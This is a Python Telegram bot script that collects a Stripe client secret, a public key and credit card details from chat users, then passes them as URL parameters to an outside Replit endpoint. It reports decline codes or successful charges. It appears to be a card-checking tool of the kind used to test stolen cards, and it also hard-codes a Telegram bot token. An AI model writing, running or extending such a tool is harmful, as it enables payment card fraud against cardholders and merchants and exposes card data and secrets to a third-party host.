import telebot
import requests

BOT_TOKEN = '6940405111:AAEN2HUlk5DtavF3NmqZF61h5373MdOe6uE'
API_BASE_URL = "https://gaystripe.replit.app/stripeinbuilt"

bot = telebot.TeleBot(BOT_TOKEN)

user_data = {}

@bot.message_handler(commands=['start'])
def start(message):
    chat_id = message.chat.id
    user_data[chat_id] = {}
    bot.send_message(chat_id, "👋 <b>Welcome!</b> Please send me your <b>client secret key</b>.", parse_mode='HTML')

@bot.message_handler(func=lambda message: message.chat.id in user_data and 'client_secret' not in user_data[message.chat.id])
def get_client_secret(message):
    chat_id = message.chat.id
    user_data[chat_id]['client_secret'] = message.text
    bot.send_message(chat_id, "🔑 <b>Client secret key received.</b> Now, please send me your <b>public key</b>.", parse_mode='HTML')

@bot.message_handler(func=lambda message: message.chat.id in user_data and 'public_key' not in user_data[message.chat.id])
def get_public_key(message):
    chat_id = message.chat.id
    user_data[chat_id]['public_key'] = message.text
    bot.send_message(chat_id, "🔓 <b>Public key received.</b> Finally, please send me your <b>credit card details</b>.", parse_mode='HTML')

@bot.message_handler(func=lambda message: message.chat.id in user_data and 'credit_card' not in user_data[message.chat.id])
def get_credit_card(message):
    chat_id = message.chat.id
    user_data[chat_id]['credit_card'] = message.text
    bot.send_message(chat_id, "⏳ <b>Processing your request, please wait...</b>", parse_mode='HTML')

    client_secret = user_data[chat_id]['client_secret']
    public_key = user_data[chat_id]['public_key']
    credit_card = user_data[chat_id]['credit_card']

    url = f"{API_BASE_URL}?cc={credit_card}&client_secret={client_secret}&pk={public_key}"
    response = requests.get(url)

    if response.status_code != 200:
        bot.send_message(chat_id, "❌ <b>Failed to connect to the API.</b>", parse_mode='HTML')
        return

    response_data = response.json()

    if 'error' in response_data:
        error_data = response_data["error"]
        error_message = error_data.get("message", "Unknown error")
        error_code = error_data.get("code", "")
        error_decline_code = error_data.get("decline_code", "")
        payment_intent_id = error_data.get("payment_intent", {}).get("id", "")

        reply_message = (f"❌ <b>Decline:</b> \n\n"
                         f"<b>Error Code:</b> {error_code}\n"
                         f"<b>Decline Code:</b> {error_decline_code}\n"
                         f"<b>Payment Intent ID:</b> {payment_intent_id}\n\n"
                         f"<b>Response / Reason ❤:</b>\n{error_message}")
        bot.send_message(chat_id, reply_message, parse_mode='HTML')
    else:
        payment_intent_id = response_data["payment_intent"].get("id", "")
        amount = response_data["payment_intent"].get("amount", 0)
        currency = response_data["payment_intent"].get("currency", "")
        description = response_data["payment_intent"].get("description", "")

        reply_message = (f"✅ <b>Payment Successful!</b>\n"
                         f"<b>Payment Intent ID:</b> {payment_intent_id}\n"
                         f"<b>Amount:</b> {amount / 100} {currency}\n"
                         f"<b>Description:</b> {description}")
        bot.send_message(chat_id, reply_message, parse_mode='HTML')

    del user_data[chat_id]

if __name__ == "__main__":
    bot.infinity_polling()
    